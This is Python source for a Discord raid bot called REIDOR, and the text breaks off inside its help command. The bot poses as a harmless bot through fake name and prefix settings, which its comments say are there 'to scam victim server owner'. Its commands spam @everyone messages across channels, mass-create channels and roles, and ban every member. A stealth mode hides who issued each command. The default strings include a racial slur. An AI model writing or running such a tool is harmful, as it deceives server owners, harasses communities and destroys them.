# ALL IMPORTS
# --------------------------
import discord
import json
import asyncio
import string
import time
import os
import platform
import datetime
import random
from discord.ext import commands
from datetime import datetime as dt

from keep_alive import keep_alive
from intstallerm import INSTALL_ALL
# try:
#     INSTALL_ALL()
# except:
#     pass


class c:
    # https://www.codegrepper.com/code-examples/actionscript/escape+code+color+for+grey
    g = '\033[92m'  # GREEN
    y = '\033[93m'  # YELLOW
    r = '\033[91m'  # RED
    w = '\033[0m'  # RESET COLOR
    p = '\033[35m'  # PURPLE
    d = '\033[30;1m'  # DULL


class Logger:
    # ALL < TRACE < DEBUG < INFO < WARN < ERROR < FATAL < OFF
    # https://www.section.io/engineering-education/how-to-choose-levels-of-logging/
    def __init__(self, printtxt: bool = True, color: bool = False, file: bool = False, filename: str = "log", time: bool = True):
        self.color = color
        self.file = file
        self.filename = filename
        self.time = time
        self.printtxt = printtxt

        if self.file:
            if (f"{self.filename}.log" in os.listdir(os.getcwd())) == False:
                with open(f"{self.filename}.log", "w", encoding="utf-8") as lfm:
                    if self.time:
                        lfm.write(
                            f"\nINFO: {dt.now()} - {self.filename}.log file created")
                    else:
                        lfm.write(
                            f"\nINFO: {self.filename}.log file created")

    def OFF(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.r}OFF:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.r}OFF:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"OFF: {dt.now()} - {final_argsc}")
                else:
                    print(f"OFF: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nOFF: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nOFF: {final_argsc}")

    def FATAL(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.r}FATAL:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.r}FATAL:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"FATAL: {dt.now()} - {final_argsc}")
                else:
                    print(f"FATAL: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nFATAL: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nFATAL: {final_argsc}")

    def ERROR(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.r}ERROR:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.r}ERROR:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"ERROR: {dt.now()} - {final_argsc}")
                else:
                    print(f"ERROR: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nERROR: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nERROR: {final_argsc}")

    def WARN(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.y}WARN:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.y}WARN:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"WARN: {dt.now()} - {final_argsc}")
                else:
                    print(f"WARN: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nWARN: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nWARN: {final_argsc}")

    def INFO(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.p}INFO:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.p}INFO:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"INFO: {dt.now()} - {final_argsc}")
                else:
                    print(f"INFO: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nINFO: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nINFO: {final_argsc}")

    def DEBUG(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.p}DEBUG:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.p}DEBUG:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"DEBUG: {dt.now()} - {final_argsc}")
                else:
                    print(f"DEBUG: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nDEBUG: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nDEBUG: {final_argsc}")

    def TRACE(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.p}TRACE:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.p}TRACE:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"TRACE: {dt.now()} - {final_argsc}")
                else:
                    print(f"TRACE: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nTRACE: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nTRACE: {final_argsc}")

    def SUCCESS(self, *args):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{c.g}SUCCESS:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{c.g}SUCCESS:{c.w} {final_argsc}")
            else:
                if self.time:
                    print(f"SUCCESS: {dt.now()} - {final_argsc}")
                else:
                    print(f"SUCCESS: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\nSUCCESS: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\nSUCCESS: {final_argsc}")

    def CUS(self, *args, topic: str = "INFO", colorc: str = "red"):
        final_argsc = ""
        for arg in args:
            final_argsc += f" {arg}"

        if self.color:
            if colorc == "red":
                colorcf = c.r
            elif colorc == "green":
                colorcf = c.g
            elif colorc == "yellow":
                colorcf = c.y
            elif colorc == "white" or (colorc.lower().startswith('n')):
                colorcf = c.w
            elif colorc == "purple":
                colorcf = c.p
            else:
                colorcf = c.y

        if self.printtxt:
            if self.color:
                if self.time:
                    print(f"{colorcf}{topic}:{c.d} {dt.now()} {c.w} -{final_argsc}")
                else:
                    print(f"{colorcf}{topic}:{c.d} {final_argsc}")
            else:
                if self.time:
                    print(f"{topic}: {dt.now()} - {final_argsc}")
                else:
                    print(f"{topic}: {final_argsc}")

        with open(f"{self.filename}.log", "a", encoding="utf-8") as fl:
            if self.time:
                fl.write(f"\n{topic}: {dt.now()} - {final_argsc}")
            else:
                fl.write(f"\n{topic}: {final_argsc}")


# MAIN STUFF
# --------------------------
botconfigdata = json.load(open("bot.json", "r"))

# REIDOR Info
bot_prefix = botconfigdata["REIDOR"]["bot-prefix"]
bot_creator_name = botconfigdata["REIDOR"]["bot-creator-name"]
bot_name = botconfigdata["REIDOR"]["bot-name"]
bot_author_icon = botconfigdata["REIDOR"]["author-icon"]
# bot safe mode what time
bot_sm_wt_jsonl = botconfigdata["REIDOR"]["safe-modes-wait-time"]
botsmwt = float(bot_sm_wt_jsonl)
stealth_mode = botconfigdata["REIDOR"]["stealth-mode-on-off"]
token = botconfigdata["bot-token"]

# FAKE Info to scam victim server owner
fake_bot_prefix = botconfigdata["FAKE"]["bot-prefix"]
fake_bot_name = botconfigdata["FAKE"]["bot-name"]
fake_bot_creator_name = botconfigdata["FAKE"]["bot-creator-name"]
fake_bot_author_icon = botconfigdata["FAKE"]["author-icon"]
fake_bot_notice_message = botconfigdata["FAKE"]["bot-notice-message"]

# LOGGER Info
if str(botconfigdata["LOGGING"]["state"]).lower().startswith('y'):
    log_state = True
else:
    log_state = False
if str(botconfigdata["LOGGING"]["color"]).lower().startswith('y'):
    log_color = True
else:
    log_color = False
if str(botconfigdata["LOGGING"]["file"]).lower().startswith('y'):
    log_file = True
else:
    log_file = False
if str(botconfigdata["LOGGING"]["time"]).lower().startswith('y'):
    log_time = True
else:
    log_time = False
if str(botconfigdata["LOGGING"]["printtxt"]).lower().startswith('y'):
    log_printtxt = True
else:
    log_printtxt = False
log_filename = botconfigdata["LOGGING"]["filename"]
# --------------------------


# CREATING THE BOT
# --------------------------
intents = discord.Intents().all()

# intents = discord.Intents()
# intents.members = True # could do this, but im not very confident about this

client = commands.Bot(command_prefix=bot_prefix, intents=intents)
client.remove_command('help')

# Creating the log object for logging.
# I didnt use a python3 logging module, i made something simple and im using it!
if log_state:
    log = Logger(printtxt=log_printtxt, time=log_time,
                 color=log_color, file=log_file, filename=log_filename)
# --------------------------


# ONLY THESE USERS ARE ABLE TO USE THE BOT COMMANDS
# --------------------------
able_users = []
with open("users.txt", 'r') as file_all_able_users:
    all_able_users = file_all_able_users.readlines()
for able_user_line in all_able_users:
    try:
        able_users.append(int(able_user_line))
    except:
        pass
if log_state:
    log.INFO("Loaded all users that can use Commands of Reidor")
# --------------------------


# NOW THE BOT IS READY
# --------------------------
@client.event
async def on_ready():
    os.system("cls")
    print("""
    ██████████████████████████████████
    █▄─▄▄▀█▄─▄▄─█▄─▄█▄─▄▄▀█─▄▄─█▄─▄▄▀█
    ██─▄─▄██─▄█▀██─███─██─█─██─██─▄─▄█
    ▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄▀▄▄▀
             Discord Bot v1.1
        """)
    if log_state:
        log.INFO(f"Logged in as {client.user.name}")
    else:
        print(f"Logged in as {client.user.name}")
    print(f"Discord.py API Version: {discord.__version__}")
    print(f"Python Version: {platform.python_version()}")
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"in {len(client.guilds)} servers!"))
    if log_state:
        log.INFO("Bot is ready to be used!")
    else:
        print("The bot is ready to be used!")


loading_msg = discord.Embed(title="Processing", color=0x5600f5)
loading_msg.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
loading_msg.set_thumbnail(
    url="https://cdn.discordapp.com/attachments/866002022464487444/866011073513652234/waiting-icon-gif-1_1.gif")
loading_msg.add_field(
    name="PLEASE WAIT", value="`PLEASE WAIT WHILE THE COMMAND IS BEEN COMPLETED`", inline=False)
loading_msg.set_footer(text=f"Bot created by {bot_creator_name}")


# SPAM COMMANDS
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------

# THE SPAM COMMAND
# Spam only into one channel ( the channel you type the command )
# --------------------------
@client.command(aliases=["s", "spamunsafe", "spamnotsafe", "unsafespam", "notsafespam", "sunsafe"])
async def spam(ctx, numberofmsges="5", everyoneyn="yes", *, messagehere="I HAD A FUCKING BONER"):
    if log_state:
        log.CUS(f"spam(unsafe) by {ctx.author.name} in {ctx.channel.name} of {ctx.guild.name}\n   Number of messages: {numberofmsges}\n   Everyone: {everyoneyn}\n    Message: {messagehere}",
                colorc="pruple", topic="COMMAND")
    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    if stealth_mode == "on":
        await ctx.message.delete()

    if int(numberofmsges) <= 650:
        yes_wl = ("yes", "y", "everyone", "true")
        if everyoneyn.lower() in yes_wl:
            for iteration, x in enumerate(range(int(numberofmsges))):
                try:
                    if str(messagehere.lower()) == "random":
                        messagehere = ''.join(random.choices(
                            string.ascii_letters + string.digits, k=40))
                    await ctx.send(f"@everyone @here - {messagehere}")
                    if log_state and log_printtxt:
                        log.SUCCESS(f"Message sent to {ctx.channel.name}")
                    else:
                        print(f"+ Message sent to {ctx.channel.name}")
                except Exception as e:
                    if log_state and log_printtxt:
                        log.ERROR(f"Unable to send message! {e}")
                    else:
                        print("- Unable to send message!", e)
                await asyncio.sleep(0.4)
        else:
            for iteration, x in enumerate(range(int(numberofmsges))):
                try:
                    if str(messagehere.lower()) == "random":
                        messagehere = ''.join(random.choices(
                            string.ascii_letters + string.digits, k=40))
                    await ctx.send(f"{messagehere}")
                    if log_state and log_printtxt:
                        log.SUCCESS(f"Message sent to {ctx.channel.name}")
                    else:
                        print(f"+ Message sent to {ctx.channel.name}")
                except Exception as e:
                    if log_state and log_printtxt:
                        log.ERROR(f"Unable to send message! {e}")
                    else:
                        print("- Unable to send message!", e)
                await asyncio.sleep(0.4)

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
            if log_state and log_printtxt:
                log.SUCCESS(f"Deleted loading message")
            else:
                print("+ Deleted loading message")
        except Exception as e:
            if log_state and log_printtxt:
                log.ERROR(f"Unable to delete the loading message! {e}")
            else:
                print("- Error occured while deleting the loading message: ", e)
    else:
        if log_state and log_printtxt:
            log.ERROR(
                f"Please enter a value below 650 as the first argument (number of messages to spam)")
        else:
            print(
                "- Please enter a value below 650 as the first argument (number of messages to spam)")
        embed = discord.Embed(title="AN ERROR HAS OCCURED!!", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878570620999319562/pngaaa.com-3484527.png")
        embed.add_field(
            name="Error:", value="Please enter a value below 650", inline=True)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
            if log_state and log_printtxt:
                log.SUCCESS(f"Deleted loading message")
            else:
                print(f"+ Deleted loading message")
        except Exception as e:
            if log_state and log_printtxt:
                log.ERROR(f"Unable to delete the loading message! {e}")
            else:
                print("- Unable to delete the loading message!", e)

        await ctx.send(embed=embed)
        if log_state and log_printtxt:
            log.INFO("Sent error message")
        else:
            print("+ Sent error message")


# THE MASS SPAM COMMAND
# Spam to all the channels in one server
# --------------------------
@client.command(aliases=["ms", "masspam", "maspam", "mspam", "masss"])
async def massspam(ctx, numberofmsges="5", everyoneyn="yes", *, messagehere="I HAD A FUCKING BONER"):

    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()

    # The number of messages should be below or equal 650
    if int(numberofmsges) <= 350:

        # If it should @everyone or no
        yes_wl = ("yes", "y", "everyone", "true")
        if everyoneyn.lower() in yes_wl:

            print(
                f"+ Spamming to every Text channel in {ctx.guild.name} - \nMention Everyone: {everyoneyn.lower()} \nNumber of messages: {numberofmsges} \nMessage: {messagehere}")

            # Every channel in the server ( this includes all Voice Channels, Text Channels and Categories )
            for channel in ctx.guild.channels:
                print(channel, "-", channel.id)

                # This is for the above given reason ( this includes all Voice Channels, Text Channels and Categories )
                try:
                    # This will get the discord channel for the channel.id
                    x = client.get_channel(channel.id)

                    # The normal spam command
                    for iteration, y in enumerate(range(int(numberofmsges))):
                        if str(messagehere.lower()) == "random":
                            messagehere = ''.join(random.choices(
                                string.ascii_letters + string.digits, k=40))
                        await x.send(f"@everyone @here - {messagehere}")
                        await asyncio.sleep(0.4)

                except AttributeError:
                    print("Its a Category or a Voice Channel, not a text channel")
                    continue
                x = None

            if stealth_mode == "off":
                await loading_sent.delete()

        else:
            # Every channel in the server ( this includes all Voice Channels, Text Channels and Categories )
            for channel in ctx.guild.channels:
                print(channel, "-", channel.id)

                # This is for the above given reason ( this includes all Voice Channels, Text Channels and Categories )
                try:
                    # This will get the discord channel for the channel.id
                    x = client.get_channel(channel.id)

                    # The normal spam command
                    for iteration, y in enumerate(range(int(numberofmsges))):
                        if str(messagehere.lower()) == "random":
                            messagehere = ''.join(random.choices(
                                string.ascii_letters + string.digits, k=40))
                        await x.send(f"{messagehere}")
                        time.sleep(0.2)

                except AttributeError:
                    print("Its a Category or a Voice Channel, not a text channel\n")
                    continue
                x = None

            try:
                if stealth_mode == "off":
                    await loading_sent.delete()
            except Exception as e:
                print("- Error occured while deleting the loading message: ", e)

    else:
        print("- Please enter a value below 350 as the first argument (number of messages to spam)")
        embed = discord.Embed(title="AN ERROR HAS OCCURED!!", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878570620999319562/pngaaa.com-3484527.png")
        embed.add_field(
            name="Error:", value="Please enter a value below 350", inline=True)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        await ctx.send(embed=embed)


# MASS CHANNEL
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------

# THE MASS CHANNEL COMMAND - UNSAFE
# --------------------------
@client.command(aliases=["mc", "masschanel", "masschanal", "masschanelunsafe"])
async def masschannel(ctx, numberofchannels="5", *, channelname="gg-niglet"):

    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()

    if int(numberofchannels) <= 100:

        newchannelname = str(channelname).replace(" ", "-").replace("[", "x").replace("]", "x").replace(":", "x").replace(
            "<", "x").replace(">", "x").replace("?", "x").replace("/", "x").replace("{", "x").replace("}", "x")

        print(
            f"+ Mass channel - Unsafe - \nNumber of Channels to create: {numberofchannels} \nChannel name: {channelname}")

        for iteration, chnls in enumerate(range(int(numberofchannels))):

            if str(channelname.lower()) == "random":
                newchannelname = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=7))

            print(f"+ Created text channel: {iteration}{newchannelname}")
            # print(chnls, iteration)
            await ctx.guild.create_text_channel(f'{iteration}{newchannelname}')

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)

    else:
        print("- Please enter a value below 100 as the first argument (number of channels to create)")
        embed = discord.Embed(title="AN ERROR HAS OCCURED!!", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878594081951981568/Channel_A_Logo_transparent.png")
        embed.add_field(
            name="Error:", value="Please enter a value below 100", inline=True)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        await ctx.send(embed=embed)


# THE MASS CHANNEL COMMAND - SAFE
# --------------------------
@client.command(aliases=["mcs", "mc-s", "mc_s", "safemasschannel"])
async def masschannelsafe(ctx, numberofchannels="5", *, channelname="gg-niglet"):

    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()

    if int(numberofchannels) <= 45:

        newchannelname = str(channelname).replace(" ", "-").replace("[", "x").replace("]", "x").replace(":", "x").replace(
            "<", "x").replace(">", "x").replace("?", "x").replace("/", "x").replace("{", "x").replace("}", "x")

        print(
            f"+ Mass channel - Safe - \nNumber of Channels to create: {numberofchannels} \nChannel name: {channelname} \nWait Time: {botsmwt} seconds")

        for iteration, chnls in enumerate(range(int(numberofchannels))):

            if str(channelname.lower()) == "random":
                newchannelname = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=7))

            print(f"+ Created text channel: {iteration}{newchannelname}")
            # print(chnls, iteration)
            await asyncio.sleep(botsmwt)
            await ctx.guild.create_text_channel(f'{iteration}{newchannelname}')

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)

    else:
        print("- Please enter a value below 45 as the first argument (number of channels to create)")
        embed = discord.Embed(title="AN ERROR HAS OCCURED!!", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878594081951981568/Channel_A_Logo_transparent.png")
        embed.add_field(
            name="Error:", value="Please enter a value below 45", inline=True)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        await ctx.send(embed=embed)


# MASS ROLE
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------

# THE MASS ROLE COMMAND - UNSAFE
# --------------------------
@client.command(aliases=["mr", "mrunsfae", "massroleunsafe"])
async def massrole(ctx, numberofroles="5", *, rolenamelol="Moderator"):

    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()

    if int(numberofroles) <= 150:

        # The permissions of this role is of an average Moderator
        role_perms = discord.Permissions(add_reactions=True, administrator=False, attach_files=True, ban_members=False, change_nickname=True, connect=True, create_instant_invite=True, deafen_members=False, embed_links=True, external_emojis=True, kick_members=False, manage_channels=False, manage_emojis=False, manage_guild=False, manage_messages=False, manage_nicknames=False, manage_permissions=False, manage_roles=False,
                                         manage_webhooks=False, mention_everyone=False, move_members=False, mute_members=False, priority_speaker=True, view_guild_insights=True,  view_channel=True,  view_audit_log=False, use_voice_activation=True, use_slash_commands=True, use_external_emojis=True, stream=True, speak=True, send_tts_messages=False, send_messages=True, request_to_speak=True, read_messages=True, read_message_history=True)

        newrolenamelol = str(rolenamelol).replace(" ", "-").replace("[", "x").replace("]", "x").replace(":", "x").replace(
            "<", "x").replace(">", "x").replace("?", "x").replace("/", "x").replace("{", "x").replace("}", "x")

        print(
            f"+ Mass Role Unsafe - \nNumber of roles to create: {numberofroles} \nName of the role: {rolenamelol} ")

        # Creating the coles with a number infront of it, so there won't be the same name repeatedly
        for iteration, chnls in enumerate(range(int(numberofroles))):

            if rolenamelol == "random":
                # This will give it a random name
                newrolenamelol = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=6))
                print(f"+ Created role: {iteration}{newrolenamelol}")

            # print(iteration, chnls)

            try:
                await ctx.guild.create_role(name=f"{iteration}{newrolenamelol}", permissions=role_perms)
            except:
                pass

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)

    else:
        print("- Please enter a value below 150 as the first argument (number of roles to create)")
        embed = discord.Embed(title="AN ERROR HAS OCCURED!!", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878971324242993182/7-77391_businessman-transparent-business-man-png.png")
        embed.add_field(
            name="Error:", value="Please enter a value below 150", inline=True)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        await ctx.send(embed=embed)

# THE MASS ROLE COMMAND - SAFE
# --------------------------


@client.command(aliases=["mrs", "mrsafe", "safemassrole"])
async def massrolesafe(ctx, numberofroles="5", *, rolenamelol="Moderator"):

    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()

    if int(numberofroles) <= 45:

        # The permissions of this role is of a Moderator
        role_perms = discord.Permissions(add_reactions=True, administrator=False, attach_files=True, ban_members=False, change_nickname=True, connect=True, create_instant_invite=True, deafen_members=False, embed_links=True, external_emojis=True, kick_members=False, manage_channels=False, manage_emojis=False, manage_guild=False, manage_messages=False, manage_nicknames=False, manage_permissions=False, manage_roles=False,
                                         manage_webhooks=False, mention_everyone=False, move_members=False, mute_members=False, priority_speaker=True, view_guild_insights=True,  view_channel=True,  view_audit_log=False, use_voice_activation=True, use_slash_commands=True, use_external_emojis=True, stream=True, speak=True, send_tts_messages=False, send_messages=True, request_to_speak=True, read_messages=True, read_message_history=True)

        newrolenamelol = str(rolenamelol).replace(" ", "-").replace("[", "x").replace("]", "x").replace(":", "x").replace(
            "<", "x").replace(">", "x").replace("?", "x").replace("/", "x").replace("{", "x").replace("}", "x")

        print(
            f"+ Mass Role Safe - \nNumber of roles to create: {numberofroles} \nName of the role: {rolenamelol} \nWait Time: {botsmwt} seconds")

        # Creating the roles with a number infront of it, so there won't be the same name repeatedly
        for iteration, chnls in enumerate(range(int(numberofroles))):
            if rolenamelol == "random":
                # This will give it a random name
                newrolenamelol = ''.join(random.choices(
                    string.ascii_letters + string.digits, k=6))
                print(f"+ Created role: {iteration}{newrolenamelol}")

            # print(iteration, chnls)
            await asyncio.sleep(botsmwt)
            try:
                await ctx.guild.create_role(name=f"{iteration}{newrolenamelol}", permissions=role_perms)
            except:
                pass

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)

    else:
        print("- Please enter a value below 45 as the first argument (number of roles to create)")
        embed = discord.Embed(title="AN ERROR HAS OCCURED!!", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.set_thumbnail(
            url="https://cdn.discordapp.com/attachments/877796755234783273/878971324242993182/7-77391_businessman-transparent-business-man-png.png")
        embed.add_field(
            name="Error:", value="Please enter a value below 45", inline=True)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        await ctx.send(embed=embed)


# MASS BAN
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------

# THE MASS BAN COMMAND - UNSAFE
# --------------------------
@client.command(aliases=["mb", "banmass", "mbu", "massbanunsafe", "unsafemassban"])
async def massban(ctx, *, banreason="You got pwned"):
    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()
    try:
        print(f"+ Mass Ban - \nReson: {banreason}")

        for user in ctx.guild.members:
            try:
                if ctx.author == user:
                    continue
                # await user.ban()
                await ctx.guild.ban(user, reason=banreason)
                print(f"+ {ctx.guild.name} - Banned:", user)
            except Exception as e:
                print(f"- Unable to Ban {user}", "-", e)

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)

    except Exception as e:
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        print("- Unable to start 'Mass Ban' -", e)


# THE MASS BAN COMMAND - SAFE
# --------------------------
@client.command(aliases=["mbs", "banmasssafe", "mbsafe", "safemb", "safemassban"])
async def massbansafe(ctx, *, banreason="You got pwned"):
    if stealth_mode == "off":
        loading_sent = await ctx.send(embed=loading_msg)
    else:
        await ctx.message.delete()
    try:
        print(
            f"+ Mass Ban - \nReson: {banreason} \nWait Time: {botsmwt} seconds")
        for user in ctx.guild.members:
            try:
                # await user.ban()
                await ctx.guild.ban(user, reason=banreason)
                print(f"+ {ctx.guild.name} - Banned:", user)
                await asyncio.sleep(botsmwt)
            except Exception as e:
                print(f"- Unable to Ban {user}", "-", e)

        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)

    except Exception as e:
        try:
            if stealth_mode == "off":
                await loading_sent.delete()
        except Exception as e:
            print("- Error occured while deleting the loading message: ", e)
        print("- Unable to start 'Mass Ban Safe' -", e)


# HELP
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------
# -----------------------------------------------------------------------------------------

@client.command(aliases=["Help", "how", "howtouse", "h"])
async def help(ctx, *, subcmnd="all"):
    # ALL COMMAND NAME LIST WITH ALIASES
    # --------------------------
    spam_unsafe_wl = ("spam", "s", "spamunsafe", "spamnotsafe",
                      "unsafespam", "notsafespam", "sunsafe")
    mass_spam_wl = ("massspam", "ms", "masspam", "maspam", "mspam", "masss")

    masschannel_unsafe_wl = ("masschannel", "mc", "masschanel",
                             "masschanal", "masschanel", "masschanelunsafe")
    masschannel_safe_wl = ("masschannelsafe", "mcs",
                           "mc-s", "mc_s", "safemasschannel")

    massrole_unsafe_wl = ("massrole", "mr", "mrunsfae", "massroleunsafe")
    massrole_safe_wl = ("massrolesafe", "mrs", "mrsafe", "safemassrole")

    massban_unsafe_wl = ("massban", "mb", "banmass", "mbu",
                         "massbanunsafe", "unsafemassban")
    massban_safe_wl = ("massbansafe", "mbs", "banmasssafe",
                       "mbsafe", "safemb", "safemassban")

    if subcmnd in spam_unsafe_wl:
        embed = discord.Embed(title="Help for Spam", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(spam_unsafe_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}s [number_of_messages] [everyone_mention_yes_or_no] [message_to_spam] `", inline=False)
        embed.add_field(
            name="Description", value="This will only spam messages in the given channel, maximum number_of_messages possible is 650, default is 5", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in mass_spam_wl:
        embed = discord.Embed(title="Help for Mass Spam", color=0x00d9ff)
        embed.set_author(name=f"{bot_name}", icon_url=f"{bot_author_icon}")
        embed.add_field(name="Other names:",
                        value=f"{str(mass_spam_wl)}", inline=False)
        embed.add_field(
            name="Usage:", value=f"`{bot_prefix}ms [number_of_messages] [everyone_mention_yes_or_no] [message_to_spam] `", inline=False)
        embed.add_field(name="Description", value="This will spam in every channel of every server the bot has been joined to, maximum number_of_messages possible is 350, default is 5, so its 5 messages for every channel one by one", inline=False)
        embed.set_footer(text=f"Bot created by {bot_creator_name}")
        await ctx.send(embed=embed)

    elif subcmnd in masschannel_unsafe_wl:
        embed = discord.Embed(
